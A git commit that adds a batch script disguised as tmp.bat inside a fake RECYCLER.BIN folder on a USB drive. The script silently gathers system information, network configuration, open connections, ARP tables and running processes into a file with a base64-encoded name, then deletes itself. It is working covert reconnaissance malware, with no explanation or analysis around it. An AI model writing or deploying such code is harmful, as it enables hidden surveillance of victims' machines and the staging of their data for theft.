540a1e5229d971dd8162212e9f51a9afec37ec64
kene2445 <obigwekene08103@gmail.com>
2023-03-03 03:40:20 -0800

    initial commit

---
+++ USB Drive/RECYCLER.BIN/E5FFCF2A5CB071EC/tmp.bat
@@ -0,0 +1,6 @@
+%comspec% /q /c systeminfo >D:\RECYCLER.BIN\E5FFCF2A5CB071EC\c3lzLmluZm8
+%comspec% /q /c ipconfig /all >>D:\RECYCLER.BIN\E5FFCF2A5CB071EC\c3lzLmluZm8
+%comspec% /q /c netstat -ano >>D:\RECYCLER.BIN\E5FFCF2A5CB071EC\c3lzLmluZm8
+%comspec% /q /c arp -a >>D:\RECYCLER.BIN\E5FFCF2A5CB071EC\c3lzLmluZm8
+%comspec% /q /c tasklist /v >>D:\RECYCLER.BIN\E5FFCF2A5CB071EC\c3lzLmluZm8
+del %0
